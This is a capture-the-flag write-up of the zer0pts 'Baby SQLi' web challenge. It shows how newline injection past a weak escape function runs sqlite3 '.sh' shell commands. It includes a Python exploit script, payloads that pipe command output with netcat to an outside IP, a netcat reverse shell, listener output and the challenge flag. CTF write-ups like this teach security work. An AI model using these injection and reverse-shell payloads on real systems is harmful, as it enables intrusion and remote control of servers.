## (Web) Baby SQLi [170 pts]

> Baby SQLi challenge is bypass of waf and using shell command.

First, You can using `.system/.shell/.sh` command and execute shell command in SQLite3

```
// SQLite3 CLI
sqlite> .sh id|nc 141.164.52.207 2

// Terminal
root@py:~# nc -lp 2
uid=0(root) gid=0(root) groups=0(root)
```
As above, you can see in sqlite3 executes a shell command using the `.sh` command.

```python
def sqlite3_query(sql):
    p = subprocess.Popen(['sqlite3', 'database.db'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    o, e = p.communicate(sql.encode())
    if e:
        raise Exception(e)
    result = []
    for row in o.decode().split('\n'):
        if row == '': break
        result.append(tuple(row.split('|')))
    return result
```
Looking at the source code, you can line jump using the `\n` character because using the `communicate()` in `subporcess.Popen()` in `sqlite3_query()`.

```python
@app.route('/login', methods=['post'])
def auth():
    username = flask.request.form.get('username', default='', type=str)
    password = flask.request.form.get('password', default='', type=str)
    if len(username) > 32 or len(password) > 32:
        flask.session['msg'] = 'Too long username or password'
        return flask.redirect(flask.url_for('home'))

    password_hash = hashlib.sha256(password.encode()).hexdigest()
    result = None
    try:
        result = sqlite3_query(
            'SELECT * FROM users WHERE username="{}" AND password="{}";'
            .format(sqlite3_escape(username), password_hash)
        )
    except:
        pass

    if result:
        flask.session['name'] = username
    else:
        flask.session['msg'] = 'Invalid Credential'
    return flask.redirect(flask.url_for('home'))
```
And looking at the source code in login logic, you can see that `username`/`password` value is input, the length is verified, and it is put in query statement and at this point, you can see that the `username` value is escaped. but, you don't worry because treats escape characters as simple string is sqlite3.

```
SELECT * FROM users where username = "\" or 1=1 -- " and password = "pocas";
```
In other words, It doensn't matter if it escaped as above.

```
SELECT * FROM users where username = "\";
.sh id|nc 141.164.52.207 2;
and password = "pocas";
```
So, you can use shell command by doing line jumps as above and using the .sh command.

```python
import requests

url = "http://web.ctf.zer0pts.com:8004"
username = '";\n.sh id|nc 2376348879 2\n'
data = {"username": username, "password": "pocas"}
requests.post(url+"/login", data)
```
```
root@py:~# nc -lp 2
uid=1000(app) gid=1000(app)
root@py:~#
```
If you write the exploit code as above, close `SELECT` statemnt and in the line immediately underneath execute `.sh` command.

```python
import requests

url = "http://web.ctf.zer0pts.com:8004"
username = '";\n.sh nc 2376348879 2 -e sh\n'
data = {"username": username, "password": "pocas"}
requests.post(url+"/login", data)
```
```
root@py:~# nc -lvnp 2
Listening on 0.0.0.0 2
Connection received on 165.227.180.221 38761
id
uid=1000(app) gid=1000(app)
cat templates/index.html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Welcome</title>
    </head>

    <body>
        <h1>Welcome, {{name}}!</h1>
        {% if name == 'admin' %}
        <p>zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p>
        {% else %}
        <p>No flag for you :(</p>
        {% endif %}
    </body>
</html>
```
Final, I pass the shell using `e` option about `nc` and read `index.html` and saw the flag.

```
zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}
```

---
